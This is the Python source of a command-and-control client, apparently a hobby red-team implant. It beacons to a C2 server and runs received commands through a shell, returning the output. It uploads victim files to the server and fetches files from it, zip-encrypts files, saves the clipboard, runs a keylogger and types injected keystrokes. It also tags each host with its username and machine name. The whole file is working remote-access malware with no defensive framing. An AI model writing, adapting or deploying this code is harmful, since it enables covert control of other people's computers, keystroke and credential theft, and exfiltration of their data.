#!/bin/python3
"""
C2 Client side code
"""
from os import chdir, getenv, uname, getcwd, mkdir, path

import platform, socket, time
from subprocess import PIPE, STDOUT, run
from pyperclip import paste, PyperclipWindowsException, PyperclipException
from pynput.keyboard import Listener, Controller
from requests import exceptions, get, post, put
from crypt import cipher
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, \
                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, DELAY, HEADER, PROXY, HTTPStatusCode, C2Commands


timestamp = str(int(time.time()))
def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
    try:
        encrypt_msg = cipher.encrypt(msg.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException as e:
        return print(e + "\n")
    
def get_filename(input_string, replace=True):
    """This function that splits a str & return the 3rd item reformatted ;)"""
    try:
        return " ".join(input_string.split()[2:]).replace("\\", "/")
    except IndexError:
        post_to_server(f"You must enter a argument after {input_string}.\n")

def on_press(key_press):
    global key_log
    key_log.append(key_press)

# Check the operating system
if platform.system() == "Windows":
    # Windows environment
    client = getenv("USERNAME", "Unknown_User") + "@" + getenv("COMPUTERNAME", "Unknown_ComputerName") + "_" + timestamp
else:
    # Linux environment
    client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
encrypted_client = cipher.encrypt(client.encode()).decode() # encoder

delay = DELAY
clip_count = 0
listener = None
key_log = []

# PROXY = {"https": "proxy.some-site.com:443"}
while True:
    try:
        response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}', headers=HEADER, proxies=PROXY)
        if response.status_code == HTTPStatusCode.NOT_FOUND.value:
            raise exceptions.RequestException
    except exceptions.RequestException as e:
        # print(e)
        time.sleep(delay)
        continue
    
    if response.status_code == HTTPStatusCode.NO_CONTENT.value:
        continue

    cmd = cipher.decrypt(response.content).decode()

    if cmd.startswith(C2Commands.CD.value): # cd command
        dir = cmd[3:]
        try:
            chdir(dir)
        except FileNotFoundError:
            post_to_server(f"{dir} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{dir} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have the permissions to access {dir}.\n")
        except OSError:
            post_to_server(f"There was an OS error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed

    elif not cmd.startswith(C2Commands.CLS.value): # client ...
        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(cmd_output.stdout.decode())

    elif cmd.startswith(C2Commands.CLS_DWN.value): # client download
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
        try:
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
                    if response.status_code == HTTPStatusCode.OK.value:
                        with open(filename, "wb") as file_handle:
                            # Decrypt the response content and write the file out to disk, then notify us on the server
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"{filename} is now on {client}.\n")
        except (PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    elif cmd.startswith(C2Commands.CLS_UP.value): # client upload
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        encrypted_filename = cipher.encrypt(filename.encode()).decode()
        try:
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
        except (PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")
        
    elif cmd.startswith(C2Commands.CLS_ZIP.value): # client zip
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        try:
            if path.isdir(filepath):
                post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n")
            elif not path.isfile(filepath):
                raise OSError
            else:
                with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                    zip_file.setpassword(ZIP_PASSWORD)
                    zip_file.write(filepath, filename)
                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
        except OSError:
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif cmd.startswith(C2Commands.CLS_UZIP.value): # client unzip
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        try:
            with AESZipFile(filepath) as zip_file:
                zip_file.setpassword(ZIP_PASSWORD)
                zip_file.extractall(path.dirname(filename))
                post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
        except (PermissionError, OSError):
            post_to_server(f"{filepath} was not found on the client.\n")
    elif cmd.startswith(C2Commands.CLS_KLL.value): # client kill
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif cmd.startswith(C2Commands.CLS_DLY.value): # client delay
        try:
            delay = float(cmd.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
        else:
            # post_to_server(f"{client} will sleep for {delay} seconds.\n")
            post_to_server(f"{client} is now configured for a {delay} second delay when set inactive.\n")

    elif cmd.startswith(C2Commands.CLS_CLP.value): # client get clipboard
        clip_count += 1
        with open(f"clipboard_{clip_count}.txt", "w") as file_handle:
            try:
                file_handle.write(paste())
            except PyperclipException or PyperclipException:
                post_to_server("The computer is currently locked. Can not get clipboard now.\n")
            else:
                post_to_server(f"clipboard_{clip_count}.txt has been saved.\n")

    elif cmd == C2Commands.CLS_KLON.value:
        if listener is None:
            listener = Listener(on_press=on_press)
            listener.start()
            post_to_server("A keylogger is now running on the client.\n")
        else:
            post_to_server("A keylogger is already running on the client.\n")

    # The "client keylog off" command will shut down the keylogger and write the results to disk
    elif cmd == C2Commands.CLS_KLOF.value:

        # Stop the listener and open Keys.log for appending our logged keys
        if listener is not None:
            listener.stop()
            with open("keylogger.log", "a") as file_handle:

                # Read in each key and make it a little more readable for us
                for a_key_press in key_log:
                    print(type(a_key_press))
                    file_handle.write(str(a_key_press).replace("Key.enter", "\n").replace("'", "")
                                      .replace("Key.space", " ").replace('""', "'")
                                      .replace("Key.shift_r", "").replace("Key.shift_l", ""))

                # Clear the key_log list and re-initialize the listener to signify "not on"
                key_log.clear()
                listener = None
                post_to_server("Key logging is now disabled on the client. Results are in Keys.log\n")
        else:
            post_to_server("Key logging is not enabled on the client.\n")

    # The "client type TEXT" command will type some text on the client's keyboard
    elif cmd.startswith(C2Commands.CLS_TYPE.value):
        keyboard = None
        try:
            # Split out the text to type and join it back together as a string, then type it
            text = " ".join(cmd.split()[2:])
            keyboard = Controller()
            keyboard.type(text)
            post_to_server(f"Your message was typed on the client's keyboard.\n")
        except IndexError:
            post_to_server(f"You must enter some text to type on the client.\n")
        except keyboard.InvalidCharacterException:
            post_to_server(f"A non-typeable character was encountered.\n")
  
    print(response.status_code)
    #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")